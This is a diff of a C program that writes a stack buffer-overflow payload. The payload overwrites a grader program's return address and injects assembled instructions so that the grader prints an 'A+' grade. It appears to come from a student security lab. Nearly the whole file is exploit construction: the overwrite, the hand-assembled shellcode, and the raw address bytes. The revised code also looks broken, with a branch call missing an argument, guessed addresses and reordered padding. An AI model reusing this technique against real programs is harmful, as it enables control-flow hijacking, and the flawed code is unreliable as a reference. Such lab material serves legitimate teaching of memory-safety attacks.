@@ -1,50 +1,54 @@
-/*--------------------------------------------------------------------*/
-/* File: createdataAplus.c                                            */
-/* Purpose: Produces a file called dataAplus that manipulates the     */
-/* grader program to print an "A+" grade.                             */
-/*--------------------------------------------------------------------*/
-
 #include <stdio.h>
 #include "miniassembler.h"
 
 int main(void) {
     FILE *dataAplus;
-    unsigned int payloadAddress, printfAddress, returnAddress;
+    unsigned int payloadAddress, printfAddress;
     unsigned int ldrInstr, blInstr;
-    int i = 0;
 
+    // Open the dataAplus file for writing
     dataAplus = fopen("dataAplus", "w+");
 
-    /* Write student name and null byte */
+    // Write the student name and a null byte, 12 characters
     fprintf(dataAplus, "Alex & Matt");
     putc('\0', dataAplus);
 
-    printfAddress = 0x400670; /*Address of printf in grader*/
-    returnAddress = 0x4008c0; /* Address to return to after  printing */
-    payloadAddress = 0x420100; /* Address where our payload will be located */
+    // Addresses need to be adjusted based on actual memory layout
+    printfAddress = 0x400690; // Address of printf in the grader
+    payloadAddress = 0x420100; // Payload location in memory
 
-    /* Padding to fill buffer and reach return address */
-    while(i < 64) {
-        putc('A', dataAplus);
-        i++;
-    }
-
-    /* Overwrite return address with the address of our payload */
+    // Overwrite the return address with our payload address
     fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);
 
-    /* Payload: Set up instructions to print "A+". Load the 
-    address of "A+" string into register for printf */
+    // Payload: Set up register to point to "A+" string for printf
     ldrInstr = MiniAssembler_ldr(0, (unsigned long)"A+"); 
     fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);
 
-    /* Call printf with "A+" string */
+    // Branch to printf with "A+" string
     blInstr = MiniAssembler_bl(printfAddress, payloadAddress);
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
 
-    /* Return to normal execution flow after printf */
-    blInstr = MiniAssembler_bl(returnAddress, payloadAddress + 8);
+    // Branch back to a safe point in the grader after printf
+    // This address needs to be adjusted based on actual memory layout
+    blInstr = MiniAssembler_bl(/* safe return address */payloadAddress + 8);
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
+    
+    // Padding to fill buffer and reach the return address
+    for (int i = 0; i < 24; i++) {
+        putc('A', dataAplus);
+    }
 
+    /* write BSS address of ldr instruction to file */
+    fprintf(dataAplus, "%c", 0x64);
+    fprintf(dataAplus, "%c", 0x00);
+    fprintf(dataAplus, "%c", 0x42);
+    fprintf(dataAplus, "%c", 0x00);
+    fprintf(dataAplus, "%c", 0x00);
+    fprintf(dataAplus, "%c", 0x00);
+    fprintf(dataAplus, "%c", 0x00);
+    fprintf(dataAplus, "%c", 0x00);
+   
+    // Close the file
     fclose(dataAplus);
     return 0;
 }
